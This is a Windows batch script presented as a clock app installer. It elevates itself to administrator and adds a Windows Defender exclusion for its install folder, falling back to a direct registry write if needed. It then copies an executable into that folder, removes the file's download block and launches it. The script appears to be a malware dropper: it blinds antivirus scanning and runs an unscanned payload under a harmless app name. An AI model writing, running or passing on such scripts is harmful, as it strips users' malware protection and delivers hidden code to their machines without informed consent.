@echo off
setlocal EnableExtensions DisableDelayedExpansion
title Clock App Setup

set "APP_DIR=%LOCALAPPDATA%\clock_app"
set "SCRIPT_DIR=%~dp0"
set "EXE_NAME=clock_app_setup.exe"
set "INSTALLER_PATH=%~1"
set "COPIED_INSTALLER="
set "LOG_FILE=%TEMP%\clock_app_setup.log"
set "COPY_TRY=0"

>> "%LOG_FILE%" echo [%DATE% %TIME%] setup_clock_app.bat started

echo ==========================================
echo Clock App Setup
echo ==========================================
echo Log: "%LOG_FILE%"

rem ── [0/5] Self-elevation ──────────────────────────────────────────────────
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo [0/5] Requesting administrator privileges...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

rem ── Running as administrator ──────────────────────────────────────────────

if not defined INSTALLER_PATH (
  if exist "%SCRIPT_DIR%%EXE_NAME%" (
    set "INSTALLER_PATH=%SCRIPT_DIR%%EXE_NAME%"
    goto :found_installer
  )
  for %%F in ("%SCRIPT_DIR%clock_app*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
  for %%F in ("%SCRIPT_DIR%*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
)

:found_installer
if not defined INSTALLER_PATH (
  call :fail "Installer not found. Expected: %EXE_NAME%"
  exit /b 1
)

echo Target folder:    "%APP_DIR%"
echo Installer source: "%INSTALLER_PATH%"
>> "%LOG_FILE%" echo Target folder: "%APP_DIR%"
>> "%LOG_FILE%" echo Installer source: "%INSTALLER_PATH%"

if not exist "%APP_DIR%" mkdir "%APP_DIR%" >> "%LOG_FILE%" 2>&1
if not exist "%APP_DIR%" (
  call :fail "Failed to create %APP_DIR%"
  exit /b 1
)

rem ── [1/5] Add Defender exclusion (before copying) ─────────────────────────
echo [1/5] Adding Defender exclusion...

rem 方法A: Add-MpPreference (CIM経由)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$t='%APP_DIR%'.TrimEnd('\').ToLower(); $p=@((Get-MpPreference).ExclusionPath); if (@($p | %%{ $_.TrimEnd('\').ToLower() }) -notcontains $t) { Add-MpPreference -ExclusionPath '%APP_DIR%' }" ^
  >> "%LOG_FILE%" 2>&1

if errorlevel 1 (
  echo [INFO] Add-MpPreference failed. Trying registry fallback...
  >> "%LOG_FILE%" echo Add-MpPreference failed. Trying registry fallback...

  rem 方法B: レジストリ直接書き込み (CIMをバイパス)
  powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths' -Name '%APP_DIR%' -Value 0 -PropertyType DWord -Force -ErrorAction Stop" ^
    >> "%LOG_FILE%" 2>&1

  if errorlevel 1 (
    call :fail "Could not add Defender exclusion by any method. Manually add '%APP_DIR%' to Windows Security > Exclusions, then rerun."
    exit /b 1
  )
)

rem ── [2/5] Verify exclusion ────────────────────────────────────────────────
echo [2/5] Verifying Defender exclusion...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$t='%APP_DIR%'.TrimEnd('\').ToLower(); $p=@((Get-MpPreference).ExclusionPath); if (@($p | %%{ $_.TrimEnd('\').ToLower() }) -contains $t) { exit 0 } else { exit 2 }" ^
  >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  call :fail "Defender exclusion NOT confirmed. Manually add '%APP_DIR%' to Windows Security > Exclusions, then rerun."
  exit /b 1
)

rem ── [3/5] Copy installer into excluded folder ─────────────────────────────
echo [3/5] Copying installer...
set "COPIED_INSTALLER=%APP_DIR%\clock_app_setup.exe"
:copy_retry
set /a COPY_TRY+=1
copy /Y "%INSTALLER_PATH%" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
if not errorlevel 1 goto copy_done
if %COPY_TRY% GEQ 8 (
  call :fail "Failed to copy installer after retries. Close any running installer/uninstaller and try again."
  exit /b 1
)
timeout /t 1 /nobreak >nul
goto copy_retry
:copy_done

rem ── [4/5] Unblock copied installer ───────────────────────────────────────
echo [4/5] Unblocking copied installer...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Unblock-File -LiteralPath '%COPIED_INSTALLER%' -ErrorAction SilentlyContinue" ^
  >> "%LOG_FILE%" 2>&1

rem ── [5/5] Launch installer ────────────────────────────────────────────────
echo [5/5] Launching installer...
if not exist "%COPIED_INSTALLER%" (
  call :fail "Copied installer not found (possibly quarantined): %COPIED_INSTALLER%"
  exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Start-Process -FilePath '%COPIED_INSTALLER%' -ErrorAction Stop" ^
  >> "%LOG_FILE%" 2>&1
if errorlevel 1 (
  call :fail "Failed to start installer: %COPIED_INSTALLER%"
  exit /b 1
)

echo ------------------------------------------
echo Completed. Continue in installer window.
echo Defender exclusion: OK
echo Log file: "%LOG_FILE%"
pause
exit /b 0

:fail
echo [ERROR] %~1
>> "%LOG_FILE%" echo [ERROR] %~1
echo See log: "%LOG_FILE%"
pause
exit /b 1
